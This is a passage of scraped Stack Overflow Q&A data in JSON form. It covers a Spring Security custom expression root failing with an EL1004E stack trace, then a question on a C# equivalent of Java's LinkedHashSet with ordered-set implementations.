org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:135)\r\n\tat org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:95)\r\n\tat org.springframework.expression.spel.ast.SpelNodeImpl.getTypedValue(SpelNodeImpl.java:117)\r\n\tat org.springframework.expression.spel.standard.SpelExpression.getValue(SpelExpression.java:308)\r\n\tat org.springframework.security.access.expression.ExpressionUtils.evaluateAsBoolean(ExpressionUtils.java:30)\r\nCaused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot\r\n```\r\n\r\nPlease tell me where I went wrong. \r\nThank so much","title":"my Spring CustomSecurityExpressionRoot not working","body":"<p>I created a New Security Expression in my spring project but it not working. Here is my code.</p>\n<p>Firstly, i make a <code>CustomPermissionEvaluator</code> which implement <code>PermissionEvaluator</code>:</p>\n<pre><code>public class CustomPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication auth, Object targetDomainObject, Object permission) {\n        if ((auth == null) || (targetDomainObject == null) || !(permission instanceof String)) {\n            return false;\n        }\n        final String targetType = targetDomainObject.getClass().getSimpleName().toUpperCase();\n        return hasPrivilege(auth, targetType, permission.toString().toUpperCase());\n    }\n\n    @Override\n    public boolean hasPermission(Authentication auth, Serializable targetId, String targetType, Object permission) {\n        if ((auth == null) || (targetType == null) || !(permission instanceof String)) {\n            return false;\n        }\n        return hasPrivilege(auth, targetType.toUpperCase(), permission.toString().toUpperCase());\n    }\n\n    private boolean hasPrivilege(Authentication auth, String targetType, String permission) {\n        for (final GrantedAuthority grantedAuth : auth.getAuthorities()) {\n            if (grantedAuth.getAuthority().startsWith(targetType) &amp;&amp; grantedAuth.getAuthority().contains(permission)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}\n</code></pre>\n<p>And <code>CustomSecurityExpressionRoot</code> implement <code>MethodSecurityExpressionOperations</code></p>\n<pre><code>public class CustomSecurityExpressionRoot implements MethodSecurityExpressionOperations {\n\n    private final Logger log = LoggerFactory.getLogger(CustomSecurityExpressionRoot.class);\n\n    protected final Authentication authentication;\n    private AuthenticationTrustResolver trustResolver;\n    private RoleHierarchy roleHierarchy;\n    private Set&lt;String&gt; roles = new HashSet&lt;&gt;();\n    private String defaultRolePrefix = &quot;ROLE_&quot;;\n    private PermissionEvaluator permissionEvaluator;\n    private MyRepository myRepository;\n\n    private Object filterObject;\n    private Object returnObject;\n\n    public CustomSecurityExpressionRoot(Authentication authentication) {\n        if (authentication == null) {\n            throw new IllegalArgumentException(&quot;Authentication object cannot be null&quot;);\n        }\n        this.authentication = authentication;\n        log.debug(&quot;Custom Security Expression Root ran&quot;);\n    }\n\n    // @Override\n    // Override some method\n\n\n    // test\n    public boolean isAdmin(Long groupId){\n        log.debug(&quot;Group Id is {}&quot;, groupId);\n        return true;\n    }\n\n    public static &lt;T&gt; boolean allIsNull(T... items) {\n        for (T item : items) if (item != null) return false;\n        return true;\n    }\n\n}\n</code></pre>\n<p>And then, I create <code>CustomMethodSecurityExpressionHandler</code> which will <code>Override method createSecurityExpressionRoot</code></p>\n<pre><code>public class CustomMethodSecurityExpressionHandler extends DefaultMethodSecurityExpressionHandler {\n\n    private final AuthenticationTrustResolver trustResolver = new AuthenticationTrustResolverImpl();\n    private ApplicationContext applicationContext;\n\n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) {\n        super.setApplicationContext(applicationContext);\n        this.applicationContext = applicationContext;\n    }\n\n    @Override\n    protected MethodSecurityExpressionOperations createSecurityExpressionRoot(Authentication authentication, MethodInvocation invocation) {\n        CustomSecurityExpressionRoot root = new CustomSecurityExpressionRoot(authentication);\n        root.setPermissionEvaluator(getPermissionEvaluator());\n        root.setTrustResolver(this.trustResolver);\n        root.setRoleHierarchy(getRoleHierarchy());\n        root.setMyRepository(applicationContext.getBean(MyRepository.class));\n        return root;\n    }\n}\n</code></pre>\n<p>And finally, I configure the application</p>\n<pre><code>@Configuration\n@EnableGlobalMethodSecurity(prePostEnabled = true)\npublic class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {\n\n    @Autowired\n    ApplicationContext applicationContext;\n\n    @Override\n    protected MethodSecurityExpressionHandler createExpressionHandler() {\n        CustomMethodSecurityExpressionHandler expressionHandler = new CustomMethodSecurityExpressionHandler();\n        expressionHandler.setPermissionEvaluator(new CustomPermissionEvaluator());\n        expressionHandler.setApplicationContext(applicationContext);\n        return expressionHandler;\n    }\n}\n</code></pre>\n<p>And I added <code>isAdmin()</code> restriction to 1 of my API</p>\n<pre><code>@RestController\n@RequestMapping(&quot;/api&quot;)\npublic class MyResource {\n\n    private final Logger log = LoggerFactory.getLogger(MyResource.class);\n\n    private static final String ENTITY_NAME = &quot;MyResource&quot;;\n\n    @Value(&quot;${jhipster.clientApp.name}&quot;)\n    private String applicationName;\n\n    private final MyService myService;\n\n    private final MyRepository myRepository;\n\n    private final MyKafkaService KafkaService;\n\n    public MyResource(GroupMemberService myService, MyRepository myRepository, MyKafkaService myKafkaService) {\n        this.myService = myService;\n        this.myRepository = myRepository;\n        this.KafkaService = KafkaService;\n    }\n    \n    @PreAuthorize(&quot;isAdmin(#week)&quot;)\n    @GetMapping(&quot;/todo/{week}&quot;)\n    public ResponseEntity&lt;List&lt;TodoDTO&gt;&gt; getAllTodoInWeek(@PathVariable Long week, Pageable pageable) {\n        log.debug(&quot;REST request to get a page of Todo&quot;);\n        Page&lt;TodoDTO&gt; page = myService.findAllByWeek(week, pageable);\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\n        return ResponseEntity.ok().headers(headers).body(page.getContent());\n    }\n}\n</code></pre>\n<p>I was excited to use postman to test this api and eagerly waiting for the desired result. But i get error <code>Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot</code></p>\n<pre><code>java.lang.IllegalArgumentException: Failed to evaluate expression 'isAdmin()'\n    at org.springframework.security.access.expression.ExpressionUtils.evaluateAsBoolean(ExpressionUtils.java:33)\n    at org.springframework.security.access.expression.method.ExpressionBasedPreInvocationAdvice.before(ExpressionBasedPreInvocationAdvice.java:51)\n    at org.springframework.security.access.prepost.PreInvocationAuthorizationAdviceVoter.vote(PreInvocationAuthorizationAdviceVoter.java:71)\n    at org.springframework.security.access.prepost.PreInvocationAuthorizationAdviceVoter.vote(PreInvocationAuthorizationAdviceVoter.java:42)\n    at org.springframework.security.access.vote.AffirmativeBased.decide(AffirmativeBased.java:60)\n    at org.springframework.security.access.intercept.AbstractSecurityInterceptor.attemptAuthorization(AbstractSecurityInterceptor.java:238)\n    at org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:208)\n    at org.springframework.security.access.intercept.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:58)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\n    at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753)\n    at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\n    at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753)\n    at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698)\n    at vn.vnedu.studyspace.group_store.web.rest.GroupMemberResource$$EnhancerBySpringCGLIB$$df9b89b9.getAllGroupMembersInGroup(&lt;generated&gt;)\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.base/java.lang.reflect.Method.invoke(Method.java:566)\n    at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)\n    at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)\n    at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)\n    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)\n    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)\n    at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\n    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)\n    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)\n    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)\n    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:497)\n    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:584)\n    at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129)\n    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327)\n    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115)\n    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:121)\n    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:115)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126)\n    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.oauth2.client.web.OAuth2AuthorizationCodeGrantFilter.doFilterInternal(OAuth2AuthorizationCodeGrantFilter.java:168)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:105)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.oauth2.server.resource.web.BearerTokenAuthenticationFilter.doFilterInternal(BearerTokenAuthenticationFilter.java:137)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter.doFilterInternal(OAuth2AuthorizationRequestRedirectFilter.java:178)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103)\n    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)\n    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110)\n    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\n    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211)\n    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183)\n    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358)\n    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)\n    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\n    at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n    at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n    at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84)\n    at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)\n    at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68)\n    at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)\n    at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68)\n    at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117)\n    at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)\n    at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n    at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)\n    at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)\n    at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)\n    at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)\n    at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)\n    at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n    at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52)\n    at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\n    at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119)\n    at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:280)\n    at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79)\n    at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134)\n    at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131)\n    at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)\n    at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)\n    at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:260)\n    at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79)\n    at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100)\n    at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387)\n    at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852)\n    at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35)\n    at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019)\n    at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558)\n    at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449)\n    at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280)\n    at java.base/java.lang.Thread.run(Thread.java:829)\nCaused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot\n    at org.springframework.expression.spel.ast.MethodReference.findAccessorForMethod(MethodReference.java:226)\n    at org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:135)\n    at org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:95)\n    at org.springframework.expression.spel.ast.SpelNodeImpl.getTypedValue(SpelNodeImpl.java:117)\n    at org.springframework.expression.spel.standard.SpelExpression.getValue(SpelExpression.java:308)\n    at org.springframework.security.access.expression.ExpressionUtils.evaluateAsBoolean(ExpressionUtils.java:30)\nCaused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot\n</code></pre>\n<p>Please tell me where I went wrong.\nThank so much</p>\n"},{"tags":["java","c#","set"],"comments":[{"owner":{"account_id":70934,"reputation":44408,"user_id":205270,"accept_rate":93,"display_name":"ceth"},"score":0,"creation_date":1329623718,"post_id":9346526,"comment_id":11798451,"body_markdown":"It will be fine if you describe what LinkedHashSet do  :)","body":"It will be fine if you describe what LinkedHashSet do  :)"},{"owner":{"account_id":16878,"reputation":306143,"user_id":37213,"accept_rate":81,"display_name":"duffymo"},"score":0,"creation_date":1329623946,"post_id":9346526,"comment_id":11798474,"body_markdown":"It&#39;s a set that maintains insertion order.  It uses a backing linked list to do it.","body":"It&#39;s a set that maintains insertion order.  It uses a backing linked list to do it."}],"answers":[{"tags":[],"owner":{"account_id":1204852,"reputation":4075,"user_id":1174750,"accept_rate":88,"display_name":"ose"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1329623925,"creation_date":1329623925,"answer_id":9346549,"question_id":9346526,"body_markdown":"There is no direct equivalent in C#. The appropriate class to use depends on the desired behaviour. The `HashSet` class will preserve the uniqueness of the elements. You may also want to check out `SortedSet` and `SortedDictionary`.\r\n\r\nThere is no class in C# that combines a Linked List with uniqueness required in a Set data structure, so if you need both behaviours then you will need to build your own.","title":"What is the equivalent of LinkedHashSet (Java) in C#?","body":"<p>There is no direct equivalent in C#. The appropriate class to use depends on the desired behaviour. The <code>HashSet</code> class will preserve the uniqueness of the elements. You may also want to check out <code>SortedSet</code> and <code>SortedDictionary</code>.</p>\n\n<p>There is no class in C# that combines a Linked List with uniqueness required in a Set data structure, so if you need both behaviours then you will need to build your own.</p>\n"},{"tags":[],"owner":{"account_id":444408,"reputation":7663,"user_id":836202,"accept_rate":80,"display_name":"George Mamaladze"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1374764707,"creation_date":1374764707,"answer_id":17861748,"question_id":9346526,"body_markdown":"I have briefly implemented a `HashSet` which guarantees insertion order. It uses the `Dictionary` to look up items and the `LinkedList` to preserve order. All three insertion, removal and lookup work still in O(1).\r\n\r\n    public class OrderedSet&lt;T&gt; : ISet&lt;T&gt;\r\n    {\r\n        private readonly IDictionary&lt;T, LinkedListNode&lt;T&gt;&gt; m_Dictionary;\r\n        private readonly LinkedList&lt;T&gt; m_LinkedList;\r\n\r\n        public OrderedSet()\r\n        {\r\n            m_Dictionary = new Dictionary&lt;T, LinkedListNode&lt;T&gt;&gt;();\r\n            m_LinkedList = new LinkedList&lt;T&gt;();\r\n        }\r\n\r\n        public bool Add(T item)\r\n        {\r\n            if (m_Dictionary.ContainsKey(item)) return false;\r\n            var node = m_LinkedList.AddLast(item);\r\n            m_Dictionary.Add(item, node);\r\n            return true;\r\n        }\r\n\r\n        void ICollection&lt;T&gt;.Add(T item)\r\n        {\r\n            Add(item);\r\n        }\r\n\r\n        public void Clear()\r\n        {\r\n            m_LinkedList.Clear();\r\n            m_Dictionary.Clear();\r\n        }\r\n\r\n        public bool Remove(T item)\r\n        {\r\n            LinkedListNode&lt;T&gt; node;\r\n            bool found = m_Dictionary.TryGetValue(item, out node);\r\n            if (!found) return false;\r\n            m_Dictionary.Remove(item);\r\n            m_LinkedList.Remove(node);\r\n            return true;\r\n        }\r\n\r\n        public int Count\r\n        {\r\n            get { return m_Dictionary.Count; }\r\n        }\r\n\r\n        public IEnumerator&lt;T&gt; GetEnumerator()\r\n        {\r\n            return m_LinkedList.GetEnumerator();\r\n        }\r\n\r\n        IEnumerator IEnumerable.GetEnumerator()\r\n        {\r\n            return GetEnumerator();\r\n        }\r\n\r\n\r\n        public bool Contains(T item)\r\n        {\r\n            return m_Dictionary.ContainsKey(item);\r\n        }\r\n\r\n        public void CopyTo(T[] array, int arrayIndex)\r\n        {\r\n            m_LinkedList.CopyTo(array, arrayIndex);\r\n        }\r\n\r\n\r\n        public virtual bool IsReadOnly\r\n        {\r\n            get { return m_Dictionary.IsReadOnly; }\r\n        }\r\n\r\n        public void UnionWith(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public void IntersectWith(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public void ExceptWith(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool IsSubsetOf(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public void SymmetricExceptWith(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool IsSupersetOf(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool IsProperSupersetOf(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool IsProperSubsetOf(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool Overlaps(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        public bool SetEquals(IEnumerable&lt;T&gt; other)\r\n        {\r\n            throw GetNotSupportedDueToSimplification();\r\n        }\r\n\r\n        private static Exception GetNotSupportedDueToSimplification()\r\n        {\r\n            return new NotSupportedException(&quot;This method is not supported due to simplification of example code.&quot;);\r\n        }\r\n    }","title":"What is the equivalent of LinkedHashSet (Java) in C#?","body":"<p>I have briefly implemented a <code>HashSet</code> which guarantees insertion order. It uses the <code>Dictionary</code> to look up items and the <code>LinkedList</code> to preserve order. All three insertion, removal and lookup work still in O(1).</p>\n\n<pre><code>public class OrderedSet&lt;T&gt; : ISet&lt;T&gt;\n{\n    private readonly IDictionary&lt;T, LinkedListNode&lt;T&gt;&gt; m_Dictionary;\n    private readonly LinkedList&lt;T&gt; m_LinkedList;\n\n    public OrderedSet()\n    {\n        m_Dictionary = new Dictionary&lt;T, LinkedListNode&lt;T&gt;&gt;();\n        m_LinkedList = new LinkedList&lt;T&gt;();\n    }\n\n    public bool Add(T item)\n    {\n        if (m_Dictionary.ContainsKey(item)) return false;\n        var node = m_LinkedList.AddLast(item);\n        m_Dictionary.Add(item, node);\n        return true;\n    }\n\n    void ICollection&lt;T&gt;.Add(T item)\n    {\n        Add(item);\n    }\n\n    public void Clear()\n    {\n        m_LinkedList.Clear();\n        m_Dictionary.Clear();\n    }\n\n    public bool Remove(T item)\n    {\n        LinkedListNode&lt;T&gt; node;\n        bool found = m_Dictionary.TryGetValue(item, out node);\n        if (!found) return false;\n        m_Dictionary.Remove(item);\n        m_LinkedList.Remove(node);\n        return true;\n    }\n\n    public int Count\n    {\n        get { return m_Dictionary.Count; }\n    }\n\n    public IEnumerator&lt;T&gt; GetEnumerator()\n    {\n        return m_LinkedList.GetEnumerator();\n    }\n\n    IEnumerator IEnumerable.GetEnumerator()\n    {\n        return GetEnumerator();\n    }\n\n\n    public bool Contains(T item)\n    {\n        return m_Dictionary.ContainsKey(item);\n    }\n\n    public void CopyTo(T[] array, int arrayIndex)\n    {\n        m_LinkedList.CopyTo(array, arrayIndex);\n    }\n\n\n    public virtual bool IsReadOnly\n    {\n        get { return m_Dictionary.IsReadOnly; }\n    }\n\n    public void UnionWith(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public void IntersectWith(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public void ExceptWith(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool IsSubsetOf(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public void SymmetricExceptWith(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool IsSupersetOf(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool IsProperSupersetOf(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool IsProperSubsetOf(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool Overlaps(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    public bool SetEquals(IEnumerable&lt;T&gt; other)\n    {\n        throw GetNotSupportedDueToSimplification();\n    }\n\n    private static Exception GetNotSupportedDueToSimplification()\n    {\n        return new NotSupportedException(\"This method is not supported due to simplification of example code.\");\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1262757,"reputation":1258,"user_id":1220653,"accept_rate":50,"display_name":"Bradley Odell"},"down_vote_count":0,"up_vote_count":12,"is_accepted":true,"score":12,"last_activity_date":1436917320,"creation_date":1436917320,"answer_id":31419199,"question_id":9346526,"body_markdown":"I completed the unfinished methods and generally polished the class that &#39;achitaka-san&#39; posted.\r\n\r\n    public class LinkedHashSet&lt;T&gt; : ISet&lt;T&gt; {\r\n    \r\n    \tprivate readonly IDictionary&lt;T, LinkedListNode&lt;T&gt;&gt; dict;\r\n    \tprivate readonly LinkedList&lt;T&gt; list;\r\n    \r\n    \tpublic LinkedHashSet(int initialCapacity) 